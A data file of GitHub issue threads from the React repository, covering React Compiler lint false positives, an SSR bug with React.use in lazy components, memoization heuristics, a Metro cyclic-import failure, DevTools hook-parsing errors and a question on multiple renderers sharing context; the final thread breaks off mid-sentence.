{"repo": "facebook/react", "issue_number": 30782, "issue_url": "https://github.com/facebook/react/issues/30782", "issue_title": "[Compiler Bug]: eslint-plugin-react-compiler errors when updating initialization of ref.current", "issue_author": "jeremy-code", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [X] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAHRFMCAEcA2AlggHYAuGA3GiTYQLYAOEMZOwOWCASggGY4Avjj4wI9HBhgIAhnAohqtEnAgkwbAKoA5AJJ6AKroCCAGV0AtAKIARHAF4cAZQCe9AEYR8ACgw79ukZmlrYYAJRKNAgAHsyseGoanNgA8iq4jgA8BgA0AHzehCSEZIQy+ABq5VAIyDgGOAA+ON7eYQ559WHt9p3ANDgJ6mzSAo5cvAKZ9U04ZC6MCBAC-oYm5tZ2nd6rgeshNhE0AziEAt6jAHRwsNLkDvaOu0Ebtu39JIODVzcwd2yOeaLZanYqlcpVfA1B6ODB8KAqUpqDA4AD8oJKZUq1QQbRwdSKmIhOKUg0Ex0+OGkZFgnx+t1IZCUgkiJBicTYABN+DIoPg2PDEYQ1DgALIuYyMRh4j7fBA0mCfTKcwgANzyAAkEPh8BAcAB1Fj4TmZAD0KvVzJoIEEQA\n\n### Repro steps\n\n1. Initialize `useRef` with some dummy value (e.g. null, Symbol, undefined, etc.) to be changed after initialization/during render.\r\n2. Update `ref.current` by checking whether it is equivalent to its initial condition (as per documentation: [useRef#Avoiding recreating the ref contents](https://react.dev/reference/react/useRef#avoiding-recreating-the-ref-contents))\r\n  - > To solve it, you may initialize the ref like this instead:\r\n  ```\r\n  function Video() {\r\n    const playerRef = useRef(null);\r\n    if (playerRef.current === null) {\r\n      playerRef.current = new VideoPlayer();\r\n    }\r\n    // ...\r\n  ```\r\n\r\n  - > Normally, writing or reading ref.current during render is not allowed. However, it\u2019s fine in this case because the result is always the same, and the condition only executes during initialization so it\u2019s fully predictable.\r\n  \r\n3. eslint-plugin-react-compiler gives error\r\n\r\n```\r\nInvalidReact: Ref values (the `current` property) may not be accessed during render. (https://react.dev/reference/react/useRef)\r\n```\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.0.0-rc-1d989965-20240821", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler", "Compiler: Ref Validation"], "comments": [{"author": "jeremy-code", "body": "Related: #30716"}, {"author": "parthnegi21", "body": "Try this\r\n\r\n\r\nimport { useRef, useState, useEffect } from \"react\";\r\n\r\nconst UNINITIALIZED = Symbol(\"UNINITIALIZED\");\r\n\r\nexport const useOnce = <T,>(initialValue: T | (() => T)) => {\r\n  const ref = useRef < T | typeof UNINITIALIZED > (UNINITIALIZED);\r\n  const [value, setValue] = useState < T | typeof UNINITIALIZED > (UNINITIALIZED);\r\n\r\n  useEffect(() => {\r\n    if (ref.current === UNINITIALIZED) {\r\n      const resolvedValue = typeof initialValue === \"function\" ? initialValue() : initialValue;\r\n      ref.current = resolvedValue;\r\n      setValue(resolvedValue);\r\n    } else {\r\n      setValue(ref.current);\r\n    }\r\n  }, [initialValue]);\r\n\r\n  return value;\r\n};\r\n\r\nexport default function MyApp() {\r\n  return <div>Hello World</div>;\r\n}\r\n\r\nState Initialization: Added a state value to store the initialized value.\r\n\r\nuseEffect: The ref is now initialized inside the useEffect hook, which sets the value both in the ref and in the state.\r\n\r\nReturn Value: The hook returns the state value, ensuring that the initial render doesn't access ref.current\r\n\r\n"}, {"author": "josephsavona", "body": "Thanks for posting. This is a known limitation of the new linter."}, {"author": "hlege", "body": "i also run into the problem in a different scenario:\r\nwhen passing the ref object to a custom hook   the compiler is not optimizing my code.  if i remove the `ref` access it works as expected.\r\n\r\n```\r\n// pass the ref object to a custom hook and it is preventing the optimizations.  \r\nconst mergedRefs = useMergedRef<HTMLDivElement>(ref, setPopperElement);\r\n```"}, {"author": "iahu", "body": "Do you deprecated to use `useRef`? if not, how to use it?\r\n\r\n```ts\r\nconst panelRef = useRef<HTMLDivElement>(null);\r\nconst width = panelRef.current?.clientWidth ?? 256; // eslint error here\r\n```"}, {"author": "alisherks", "body": "Is there any available workaround for this? This limitation also affects the [useImperativeHandle](https://playground.react.dev/#N4Igzg9grgTgxgUxALhAHRFMCAEcA2AlggHYAuGA3GiTYQLYAOEMZOwOAZiwO4CGMACYAlBJwA0OLAgCSTBDD5lCANwQAJPiUH5cAXy4wI9HBhgI+cCiGq0ScCCTBsAsgE8AwseYlSbALxcvAIiYgAUnFD2yo447l5Mjn5hjEaMYJLcMPxCCKGcAJTsNDhS2HKMCkqqGlo6CBHBufmSYUX+AHzFJKWl5mSwPcB6tqV6kgDaALoFozj9gzgkUPj4tnqzIHpAA)."}, {"author": "alisherks", "body": "To anyone encountering optimization issues with the usage of `useImperativeHandle`, you can place the `forwardedRef` inside a `useState` hook.\r\n```js\r\nconst [refs] = useState(() => {\r\n    return { forwardedRef };\r\n});\r\n```\r\nThis [works](https://playground.react.dev/#N4Igzg9grgTgxgUxALhAHRFMCAEcA2AlggHYAuGA3GiTYQLYAOEMZOwOAZiwO4CGMACYAlBJwA0OLAgDKZPmQSTpASSYIYCwgDcEACT4lB+XAF8uMCPRwYYCPnAohqtEnAgkwbALIBPAMJWzCSkbAC8XLwCImIAFJxQbmSEHjh+gUweobGMloxgktww-EIIMZwAlOw0OHgeXjgA2nacYAC6OBHScgoIsbFVYQB81SS1tXZksGMcRSWCZaKcOKYutaYVa1LYaowaWroGRiaxLWAAdHPRi2KSA50jwDXjk9Psq8+mko1tm8+vMDGJCg+HwLg2lBApiAA) against latest experimental release (0.0.0-experimental-4e0eccf-20240830). It probably breaks the rules, but so far didn't encounter serious issues."}, {"author": "nkalpakis21", "body": "built an app to get paid for this PR\r\nhttps://www.n0va-io.com/discover/facebook/react"}, {"author": "ravicious", "body": "I think this is addressed in `19.0.0-beta-8a03594-20241020`. I have a hook that looks like this:\r\n\r\n```typescript\r\nexport function useLogger(name: string) {\r\n  const loggerRef = useRef<Logger>(null);\r\n  if (loggerRef.current === null) {\r\n    loggerRef.current = new Logger(name);\r\n  }\r\n\r\n  return loggerRef.current;\r\n}\r\n```\r\n\r\nThe linter rule complains only about that `.current` in the return statement. However, the conditional needs to have exactly this form of `fooRef.current === null`, otherwise the rule will report a false positive."}]}
{"repo": "facebook/react", "issue_number": 33937, "issue_url": "https://github.com/facebook/react/issues/33937", "issue_title": "Bug: `React.use` inside `React.lazy`-ed component returns other `React.use` value on SSR", "issue_author": "hi-ogawa", "issue_body": "<!--\n  Please provide a clear and concise description of what the bug is. Include\n  screenshots if needed. Please test using the latest version of the relevant\n  React packages to make sure your issue has not already been fixed.\n-->\n\nReact version: 19.1.0, 19.2.0-canary-dffacc7b-20250717\n\n## Steps To Reproduce\n\nRun a following code:\n\n```js\n// [Component Tree]\n// \n// Component1 -> use(promise1)\n//   Component2Lazy\n//     COmponent2 -> use(promise2)\n\nimport React from \"react\";\nimport ReactDOMServer from \"react-dom/server.edge\";\n\nconst promise1 = Promise.resolve(\"value1\");\nconst promise2 = Promise.resolve(\"value2\");\n\nfunction Component1() {\n  const data = React.use(promise1);\n  console.log(\"[Component1] React.use(promise1) =\", data);\n  return React.createElement(\n    \"div\",\n    null,\n    `Component1: ${data}`,\n    React.createElement(Component2Lazy),\n  );\n}\n\nfunction Component2() {\n  const data = React.use(promise2);\n  console.log(\"[Component2] React.use(promise2) =\", data);\n  return React.createElement(\"div\", null, `Component2: ${data}`);\n}\n\nconst Component2Lazy = React.lazy(async () => ({ default: Component2 }));\n\nfunction App() {\n  return React.createElement(\"div\", null, React.createElement(Component1));\n}\n\nasync function main() {\n  console.log(\"react\", React.version);\n  console.log(\"react-dom\", ReactDOMServer.version);\n  try {\n    const stream = await ReactDOMServer.renderToReadableStream(React.createElement(App));\n    let html = \"\";\n    await stream.pipeThrough(new TextDecoderStream()).pipeTo(\n      new WritableStream({\n        write(chunk) {\n          html += chunk;\n        },\n      }),\n    );\n    console.log(\"HTML output:\", html);\n  } catch (error) {\n    console.error(\"Error:\", error);\n  }\n}\n\nmain();\n```\n\n\nLink to code example:\n- https://github.com/hi-ogawa/reproductions/tree/main/waku-1496-react-use-mixed-up\n- https://stackblitz.com/github/hi-ogawa/reproductions/tree/main/waku-1496-react-use-mixed-up?file=index.js (same code on stackblitz)\n\n\n## The current behavior\n\nI also checked 19.2.0-canary-dffacc7b-20250717 showing the same behavior.\n\n```sh\n$ node index.js\nreact 19.1.0\nreact-dom 19.1.0\n[Component1] React.use(promise1) = value1\n[Component2] React.use(promise2) = value1    \ud83d\udc48\ud83d\udc48\ud83d\udc48 `value2` is expected\nHTML output: <div><div>Component1: value1<div>Component2: value1</div></div></div>\n```\n\n## The expected behavior\n\n```sh\n$ node index.js\nreact 19.1.0\nreact-dom 19.1.0\n[Component1] React.use(promise1) = value1\n[Component2] React.use(promise2) = value2 \nHTML output: <div><div>Component1: value1<div>Component2: value2</div></div></div>\n```\n\n## (context)\n\nWe found a issue where multiple `React.use` calls in different components are mixed up on Waku https://github.com/wakujs/waku/issues/1496. I haven't fully tied two issues, but I suspect client reference becoming implicitly being lazy component during ssr is causing a similar behavior.", "issue_labels": ["Type: Bug", "Component: Server Rendering"], "comments": [{"author": "himself65", "body": "Just found the similar issue:\n\nhttps://github.com/facebook/react/issues/27731"}, {"author": "hi-ogawa", "body": "Here are two workaround I'm exploring on user land. As in the reproduction, the component tree of a broken case looks like:\n\n```\n\u274c Comp with use -> lazy -> Comp with use \n```\n\nBy replacing top level `use` (at least the ones used inside framework) with legacy \"throw thenable\" use implementation, it avoids breaking `use` usage in end-user's component. cf. https://github.com/wakujs/waku/pull/1542\n\n```\n\u2705 Comp with legacy-use -> lazy -> Comp with use\n   ^^^^^^^^^^^^^^^^^^^^\nframework's internal component\n                                   ^^^^^^^^^^^^^^\n                                   framework end-user's component\n```\n\nAnother approach is to somehow wrap each \"framework end-user's component\" with additional functional component since it seems to avoid React SSR thenable state bug by nesting function component at least twice. Depending on framework's convention, this might be possible.  cf. https://github.com/wakujs/waku/pull/1545\n\n```\n\u2705 Comp with use -> Comp -> lazy -> Comp with use\n\u2705 Comp with use -> lazy -> Comp -> Comp with use\n```\n"}, {"author": "sairamarava", "body": "Is the issue closed? I want to work on this one. Could anyone please tell?\n"}, {"author": "himself65", "body": "> Is the issue closed? I want to work on this one. Could anyone please tell?\n\nthere is already the PR, see https://github.com/facebook/react/pull/33941"}, {"author": "sairamarava", "body": "> > Is the issue closed? I want to work on this one. Could anyone please tell?\n> \n> there is already the PR, see [#33941](https://github.com/facebook/react/pull/33941)\n\nYeah sorry about that. "}]}
{"repo": "facebook/react", "issue_number": 34014, "issue_url": "https://github.com/facebook/react/issues/34014", "issue_title": "[Compiler Bug]:  Compiler does not optimize functions unless manually memoized", "issue_author": "imteammy", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhASwLYAcIwC4AEASggIZyEBmMEGBA5DGRfQNwA6Adl5VJxWgicCAcwR4AkgBMAynlwIAFAEoCwLgQIAbcQTRSCAXgIAGDsIJM8sYb355BwsXgCqnNAEcoCaSrUbNS3EbAgADfQBaABJgAGpY-QBfUPNNRPN0rjghMEJnN09vaSNRcWk5BRVzHj4BIQIoMB8pP3ULKxD89y9mqq5Erhr7Rwam6QB1NDwACxcmgFkEDAhWgI6YYRJyPAA6RoRF5cU-QwA+UtduopblABoCAG0AXWUMwc47OuF9ianZprkpDwSlUbU02U4uUe+ieJS2FD2ALwQKUXUKvWUyjWwQ2eikb04IESQA\n\n### Repro steps\n\nI've noticed that the React compiler doesn't memoize a function (e.g. getUniqueId) returned from a custom hook, even though it's referentially stable. When I manually wrap the return value in React.useMemo, the compiler optimizes it correctly. Is this expected behavior?\n\nSource Code:\n```typescript\nimport React from 'react';\n\nfunction getIdStore() {\n  let id = 0;\n  return function getUniqueId() {\n    return `id-${++id}`;\n  };\n};\nconst getUniqueId = getIdStore();\n\nfunction useId() {\n  return getUniqueId();\n}\n\nfunction useIdWithUseMemo() {\n  return React.useMemo(() => getUniqueId(), []);\n}\n\nfunction useIdWithUseState() {\n  const [id] = React.useState(getUniqueId())\n  return id;\n}\n\n```\n\n\nAfter React Compiler\n\n```typescript\nimport { c as _c } from \"react/compiler-runtime\";\nimport React from \"react\";\n\nfunction getIdStore() {\n  let id = 0;\n  return function getUniqueId() {\n    return `id-${++id}`;\n  };\n}\nconst getUniqueId = getIdStore();\n\nfunction useId() {\n  return getUniqueId();\n}\n\nfunction useIdWithUseMemo() {\n  const $ = _c(1);\n  let t0;\n  if ($[0] === Symbol.for(\"react.memo_cache_sentinel\")) {\n    t0 = getUniqueId();\n    $[0] = t0;\n  } else {\n    t0 = $[0];\n  }\n  return t0;\n}\n\nfunction useIdWithUseState() {\n  const $ = _c(1);\n  let t0;\n  if ($[0] === Symbol.for(\"react.memo_cache_sentinel\")) {\n    t0 = getUniqueId();\n    $[0] = t0;\n  } else {\n    t0 = $[0];\n  }\n  const [id] = React.useState(t0);\n  return id;\n}\n\n```\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.1.0\n\n### What version of React Compiler are you using?\n\n0.0.0-experimental-2db0664-20250725", "issue_labels": ["Type: Bug", "Status: Unconfirmed"], "comments": [{"author": "bgauryy", "body": "Can you check it up?\nCreated a root cause analysis using [octocode-mcp](https://github.com/bgauryy/octocode-mcp)\nhttps://gist.github.com/bgauryy/5b044e85b5caab09b4bee8e94ba78968"}, {"author": "josephsavona", "body": "By default the compiler infers which functions are components/hooks using the heuristic described in the docs: https://react.dev/reference/react-compiler/compilationMode\n\nIn this case, the useId() hook is named like a hook, but doesn\u2019t call other hooks or have any JSX. You can add \u201cuse memo\u201d to the hook (see above link for full example) to ensure it\u2019s memoized. This heuristic is necessary to not accidentally compile functions that happen to start w \u201cuse\u201d that aren\u2019t meant to be hooks. "}, {"author": "imteammy", "body": "Thanks for the explanation!\n\nI\u2019ve been using `\"infer\"` mode by default, so I didn\u2019t realize some values weren\u2019t being memoized automatically \u2014 and had to add `\"use memo\"` manually.\n\nI understand it better now and will go back to the docs for a closer look. I\u2019ll also try comparing with `\"all\"` mode more carefully, since I did run into some issues even when using it before.\n\nAppreciate the help and the link to the docs!"}, {"author": "josephsavona", "body": "As the docs say, we do not recommend \u201call\u201d mode. It\u2019s only meant for the compiler\u2019s internal test suite. \n\n\u201cInfer\u201d is a good default, combined with occasional \u201cuse memo\u201d for hooks that don\u2019t call other hooks or create jsx. "}]}
{"repo": "facebook/react", "issue_number": 31474, "issue_url": "https://github.com/facebook/react/issues/31474", "issue_title": "[Compiler Bug]: Getting false eslint error from compiler", "issue_author": "PraveenVerma17", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [X] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nNot Applicable. \n\n### Repro steps\n\nimport { useEffect, useRef } from 'react'\r\n\r\nconst usePrevious = <T>(value: T): T => {\r\n  // The ref object is a generic container whose current property is mutable ...\r\n  // ... and can hold any value, similar to an instance property on a class\r\n  // eslint-disable-next-line @typescript-eslint/no-explicit-any\r\n  const ref: any = useRef<T>()\r\n  // Store current value in ref\r\n  useEffect(() => {\r\n    ref.current = value\r\n  }, [value]) // Only re-run if value changes\r\n  // Return previous value (happens before update in useEffect above)\r\n  return ref.current\r\n}\r\n\r\nexport default usePrevious\r\n\r\n**Getting false eslint error, above is a custom hook to store previous state value.** \r\n\r\nRef values (the `current` property) may not be accessed during render. (https://react.dev/reference/react/useRef)eslint(react-compiler/react-compiler)\r\n\r\n\r\n\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n18\n\n### What version of React Compiler are you using?\n\n19.0.0-beta-63b359f-20241101", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler", "Compiler: Ref Validation"], "comments": [{"author": "josephsavona", "body": "This is a valid error, as the code is accessing the value of a ref in render. The error means you're doing something unsafe \u2014 and the majority of the time this is likely unintentional by developers who don't realize it's a problem or didn't notice. If you have tested and are sure this isn't going to cause problems, you can of course suppress the lint violation."}]}
{"repo": "facebook/react", "issue_number": 32440, "issue_url": "https://github.com/facebook/react/issues/32440", "issue_title": "[Compiler Bug]: Cyclic dependencies when using the react-compiler and metro bundler can result in sometimes undefined hook imports", "issue_author": "the-simian", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nwill update \n\n### Repro steps\n\nThis particular issue can be difficult to reproduce. \n\nThe short version is that in some situations, when there is a cyclic dependency between two files using the metro bundler, when you enable the React compiler it can cause hooks to be imported as 'undefined'.\n\nTo reproduce this an expo Project is needed:\n\nbabel.config.js\n```\nmodule.exports = (api) => {\n  api.cache(true);\n\n  return {\n    presets: [['babel-preset-expo', { jsxImportSource: 'nativewind' }], 'nativewind/babel'],\n    plugins: [\n      [\n        'babel-plugin-react-docgen-typescript',\n        {\n          exclude: 'node_modules',\n          include: 'components.*\\\\.tsx$',\n        },\n      ],\n    ],\n  };\n};\n```\n\nHere is an example babel config, aside from nativewind it is a basic setup:\n\napp.config.ts\n```ts\n  web: {\n    bundler: 'metro',\n    output: 'single',\n    favicon: './assets/images/favicon.png',\n  },\n  experiments: {\n    typedRoutes: true,\n    reactCompiler: true,\n  },\n```\nIn the experiements section, you'll want to setReactCompiler:true. You can see the issue when you use the web output of the expo project.\n\nIf you've enabled the compiler, you'll see additional output in the console:\n```sh\nExperimental React Compiler is enabled.\nStarting Metro Bundler\nwarning: Bundler cache is empty, rebuilding (this may take a minute)\n```\n\nYou should run the development build, and not expo go if possible.\n\n\nHere are the versions of critical dependencies that can reproduce the issue currently:\n\npackage.json\n```json\n  \"expo\": \"~52.0.36\",\n  \"react\": \"18.3.1\",\n  \"react-compiler-runtime\": \"^19.0.0-beta-21e868a-20250216\",\n  \"react-dom\": \"18.3.1\",\n```\nat the time of creating this issue, this should be the latest version of the react-compiler-runtime and also the latest version of expo 52, react is at 18.\n\n\nNow, to show some code that can express the issue:\n\n\nin one file you want to write a function that uses a hook , this may or may not be a hook or provider or just a simple function:\n\nexternal-function-file.tsx\n```tsx\nimport { useMyHook } from './SomeFile';\n\nexport function externalFunction() {\n  const { datum } = useMyHook();\n  return datum ;\n}\n```\n\nin the other file, you need to call this hook in some way, but you've also defined the same hook in this file\n\nSomeFile.tsx\n```tsx\n\ntype MyContext = { datum: string; }\n\nexport const myContext = createContext<MyContext | undefined>(undefined);\n\nexport useMyHook() {\n  const context = useContext(myContext);\n  return context;\n}\n\nexport function SomeComponent(){\n  const _datum = externalFunction();\n   return <View><Text>{_datum}</Text></View>\n}\n\n```\n\nThis is the gist of what can get a reliable break. You will see an error like:\n\n```sh\nUncaught Error\nuseMyHook is not a function\n```\n\nhowever, when you inspect the source code, its clearly defined (even in the source output in the browser), and also passes linters, such as eslint-plugin-react-compiler, as well as type checks in ts.\n\n\n### How often does this bug happen?\n\nSometimes\n\n### What version of React are you using?\n\n18.3.1\n\n### What version of React Compiler are you using?\n\n^19.0.0-beta-21e868a-20250216", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler"], "comments": [{"author": "the-simian", "body": "Note: I wanted to get a straightforward explanation of what was observed based on @poteto 's suggestion, I'm aware that an issue like this will require a repro repo, with minimal deps. I'll try to stay active on this issue and help with this, but wanted to open the issue earnestly to get it documented.\n\nAlso a point of clarity on \"how often does this bug happen? \"sometimes\"?\n\nWhen there is an Uncaught Error, where an imported hook is undefined, it will always break reliably; however, not every cyclic dependency will always break in my experience. Sometimes in one place the import will work as normally expected, but in another it will cause an Uncaught Error. Disabling the react  compiler via the app config will result in the expected behavior where you can import hooks anywhere and everything works as expected.\n\nAnother thing to know: putting all the necessary function declarations in a single, monolithic file can make the issue go away. The issue is occurs when you break things up and move them to multiple files via import/export \n\n"}, {"author": "poteto", "body": "I was able to get a minimal repro: https://github.com/poteto/repro-32440. Not sure if it's an Expo or Metro bug, but I'll file an issue with Expo first so they can triage."}, {"author": "poteto", "body": "https://github.com/expo/expo/issues/35100"}, {"author": "poteto", "body": "This should be now fixed by https://github.com/expo/expo/pull/38111"}]}
{"repo": "facebook/react", "issue_number": 24980, "issue_url": "https://github.com/facebook/react/issues/24980", "issue_title": "[DevTools Bug]: \"Hook parsing failed\" Components tab", "issue_author": "adrian19hub", "issue_body": "### Website or app\n\nhttps://studio-test-2.netlify.app/\n\n### Repro steps\n\nclick \"Components\" tab\r\nclick on component\r\nclick \"parse hook names\"\r\n\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\n_No response_\n\n### DevTools version (automated)\n\n4.25.0\n\n### Error message (automated)\n\n\"Hook parsing failed\"\n\n### Error call stack (automated)\n\n_No response_\n\n### Error component stack (automated)\n\n_No response_\n\n### GitHub query string (automated)\n\n_No response_", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "tamirmatz", "body": "i have the same issue... "}, {"author": "mondaychen", "body": "Which component? I tried on the input box and it worked for me\r\n<img width=\"948\" alt=\"image\" src=\"https://user-images.githubusercontent.com/1001890/180794433-3db7019f-043e-43da-83cb-3b1ead195f1c.png\">\r\n"}, {"author": "adrian19hub", "body": "> Which component? I tried on the input box and it worked for me <img alt=\"image\" width=\"948\" src=\"https://user-images.githubusercontent.com/1001890/180794433-3db7019f-043e-43da-83cb-3b1ead195f1c.png\">\r\n\r\ninteresting..\r\nNone of them work for me"}, {"author": "mondaychen", "body": "Can you please provide more information, such as name and version of your browser, OS, etc., as well as devtools extension version and react version?"}, {"author": "adrian19hub", "body": "> Can you please provide more information, such as name and version of your browser, OS, etc., as well as devtools extension version and react version?\r\n\r\nbrowser - Chrome 103.0.5060.134\r\nOS - Windows 10 Pro, 21h2 19044.1826\r\nReact version - 17.0.2\r\nDevtools version - 4.25.0 (7/13/2022)\r\n\r\nThanks"}, {"author": "adrian19hub", "body": "anyone? :("}, {"author": "mondaychen", "body": "I tried it on Windows 10 and it still worked for me.\r\nCan you try it on a clean profile (without any other extensions)?"}, {"author": "adrian19hub", "body": "> I tried it on Windows 10 and it still worked for me. Can you try it on a clean profile (without any other extensions)?\r\n\r\nTried, worked one time  "}, {"author": "mondaychen", "body": "If it works for you on a clean profile, you might have some special environmental set-up that breaks the feature. Maybe you can try disable some of your other extensions, or check if you turned on some experimental Chrome feature flags."}, {"author": "adrian19hub", "body": "> If it works for you on a clean profile, you might have some special environmental set-up that breaks the feature. Maybe you can try disable some of your other extensions, or check if you turned on some experimental Chrome feature flags.\r\n\r\nUnfortunately it worked only one time."}, {"author": "mondaychen", "body": "Do you mean it worked for the first time, but stopped working when you move away from the component and try parse again?\r\nAny chance you can provide a video?"}, {"author": "adrian19hub", "body": "> Do you mean it worked for the first time, but stopped working when you move away from the component and try parse again? Any chance you can provide a video?\r\n\r\nIf i recall well than yes,\r\ntried to make a video but i couldn't reproduce the issue :/ "}, {"author": "mondaychen", "body": "If it's no longer an issue, can I close this?"}, {"author": "adrian19hub", "body": "> If it's no longer an issue, can I close this?\r\n\r\nIt still is :), i couldn't reproduce the solving by using clean profile."}, {"author": "lunaruan", "body": "Hey, I am unable to reproduce this issue, and it seems as if @mondaychen was unable to reproduce this issue as well. I'm going to close this for now since we can't do anything about it, but if you are able to create a consistent repro case please feel free to reopen!"}, {"author": "adrian19hub", "body": "> Hey, I am unable to reproduce this issue, and it seems as if @mondaychen was unable to reproduce this issue as well. I'm going to close this for now since we can't do anything about it, but if you are able to create a consistent repro case please feel free to reopen!\r\n\r\nIs it possibly related to this popup?\r\n![image](https://user-images.githubusercontent.com/79521379/187071869-87c23bc4-ddf1-43b2-b2a9-1308f5ad421f.png)\r\n"}, {"author": "ilyvion", "body": "I've never gotten this to work either, but I couldn't tell you why. Always the same outcome, on every React project I have, in multiple browsers:\r\n![image](https://user-images.githubusercontent.com/767490/198818837-27511356-40e4-4aca-a780-603fa9229d04.png)\r\n"}, {"author": "back2Lobby", "body": "> I've never gotten this to work either, but I couldn't tell you why. Always the same outcome, on every React project I have, in multiple browsers: ![image](https://user-images.githubusercontent.com/767490/198818837-27511356-40e4-4aca-a780-603fa9229d04.png)\r\n\r\nI am facing exactly same issue in my react-ts app on Ubuntu 22. I tried it on different browsers but still same, it doesn't even show any error message except \"Hook parsing failed\""}, {"author": "holaChaitanya", "body": "![image](https://github.com/facebook/react/assets/86062961/6fda7750-04c2-404f-b762-b4a87a85e081)\r\nTried multiple times, but faced the same issue"}, {"author": "kevinbarabash", "body": "I'm seeing the same issue."}, {"author": "jamesbvaughan", "body": "@kevinbarabash What version of the extension do you have installed? My fix was released in version 5.0.2. If you're on that version or higher, then my fix must not have covered all cases. In that case, can you provide a reproduction?"}, {"author": "maxbarry", "body": "I've always had this issue on projects that use [Recoil](https://github.com/facebookexperimental/Recoil) for state management.\r\n\r\nNot sure if that's supposed to be supported, but here's a minimal repro. Under 5.0.2 I get \"Hook parsing failed\" and no value for the Recoil data (`Username`), while the `useState` value does display, but without its name (`count`).\r\n\r\n![image](https://github.com/facebook/react/assets/892447/2506ba00-7505-40bf-a602-79b7bb1898e2)\r\n\r\n```javascript\r\nimport React, { useState} from 'react'\r\nimport ReactDOM from 'react-dom'\r\nimport { RecoilRoot, atom, useRecoilValue } from 'recoil'\r\n\r\nconst RecoilApp = () => (\r\n    <RecoilRoot>\r\n        <App />\r\n    </RecoilRoot>\r\n)\r\n\r\nconst App = () => {\r\n    const [ count, setCount ] = useState(0)\r\n    const name = useUsername()\r\n\r\n    return (\r\n\t<RecoilRoot>\r\n            <button onClick={() => setCount(count + 1)}>\r\n\t\t{name} count: {count}\r\n\t    </button>\r\n\t</RecoilRoot>\r\n    )\r\n}\r\n\r\nconst username = atom({\r\n    key: 'username',\r\n    default: 'Guest',\r\n})\r\n\r\nconst useUsername = () => useRecoilValue(username)\r\n\r\nReactDOM.render(\r\n    <React.StrictMode>\r\n\t<RecoilApp />\r\n    </React.StrictMode>,\r\n    document.getElementById('root')\r\n)\r\n```\r\n\r\nedit: I just noticed that DevTools does start working if I abandon the `useRecoilValue` abstraction. Which I can't do without making my code much too verbose, but anyway, I can avoid \"hook parsing failed\" errors if I replace `useUsername` with this directly inside `App`:\r\n```javascript\r\n    const name = useRecoilValue(username)\r\n```\r\n\r\n\r\n\r\n"}, {"author": "carolineartz", "body": "@maxbarry i dunno if you're still on that...but I know that you can `useDebugValue` in a custom hook like your recoil value abstractions...not saying that's great \ud83d\ude06  or doesn't make things much more verbose... but at least its easier to add during dev and applies across all your components that use it...i'm using recoil (unfortunately) and I do this sometimes :/\r\n\r\n```ts\r\nconst useUsername = () => {\r\n  const username =  useRecoilValue(username)\r\n  useDebugValue(username)\r\n  \r\n  return username\r\n}\r\n```\r\n\r\ndev tools => Username: whatever"}, {"author": "Sbrjt", "body": "https://github.com/facebook/react/issues/25427"}]}
{"repo": "facebook/react", "issue_number": 19519, "issue_url": "https://github.com/facebook/react/issues/19519", "issue_title": "Why does React warn about multiple renderers using the same context provider?", "issue_author": "vimcaw", "issue_body": "I am currently developing a web app that uses both [react-pixi](https://github.com/inlet/react-pixi) and [react-babylonjs](https://github.com/brianzinn/react-babylonjs). Both of these libraries use `react-reconciler` and have a custom renderer. I also use redux in my project, so they share the same Context in the two libraries. \r\n\r\nIt displays a warning on Console after every redux state updating, but everything works well, both renderers can trigger an update.\r\n\r\nI want to know if there is any risk in doing this, or is this just a false warning?\r\n\r\nReact version: 16.13.1\r\n\r\n## Steps To Reproduce\r\n\r\n1. Using multiple react renderers\r\n2. Using the same context provider between that react renderers\r\n\r\nLink to code example: https://codesandbox.io/s/multiple-reconciler-using-same-context-v8kq1?file=/src/App.js\r\n\r\n## The current behavior\r\n\r\nIt will throw a warning message after every state updating:\r\n\r\n> Warning: Detected multiple renderers concurrently rendering the same context provider. This is currently unsupported. \r\n\r\nBut everything works well, both renderers can trigger an update.\r\n\r\n## The expected behavior\r\n\r\nDon't show any warning.", "issue_labels": ["Type: Question"], "comments": [{"author": "bvaughn", "body": "React only supports two concurrent renderers at most\u2013\u00a0one \"primary\" and one \"secondary\", e.g. React DOM (primary) and React ART (secondary) or React Native (primary) and Fabric (secondary). This is partially a practical constraint (in that it covers 99% of use cases) and partially an intentional trade off in that certain APIs (like Context or `useMutableSource`) are able to be more efficiently implemented because of it.\r\n\r\nFor example, rather than using a (slower) `Map` structure to maintain a (per-renderer) stack of context values, the Context API is able to store this stack on the context object using a designated field:\r\nhttps://github.com/facebook/react/blob/93a0c2830534cfbc4e6be3ecc9c9fc34dee3cfaa/packages/react-reconciler/src/ReactFiberNewContext.new.js#L78-L111\r\n\r\nSame for the `useMutableSource` 